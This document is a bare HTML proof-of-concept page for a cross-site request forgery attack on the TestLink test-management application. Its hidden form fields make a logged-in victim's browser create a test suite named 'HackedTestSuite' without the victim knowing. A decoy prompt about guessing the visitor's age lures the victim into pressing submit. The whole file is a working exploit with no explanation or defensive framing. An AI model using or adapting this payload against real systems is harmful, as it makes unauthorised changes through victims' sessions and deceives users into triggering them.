<form method='post' action='http://localhost/testlink/lib/testcases/containerEdit.php?containerID=1'>
	<input type='hidden' name='add_testsuite' value='add_testsuite' />
	<input type='hidden' name='container_name' value='HackedTestSuite' />
	<input type='hidden' name='details' value='Test suite created by CSRF attack' />
	<label>Write your last name and I will guess your age</label>
	<input type='text' name='fake' value='' />
	<input type='submit' name='submit' value='Send' />
</form>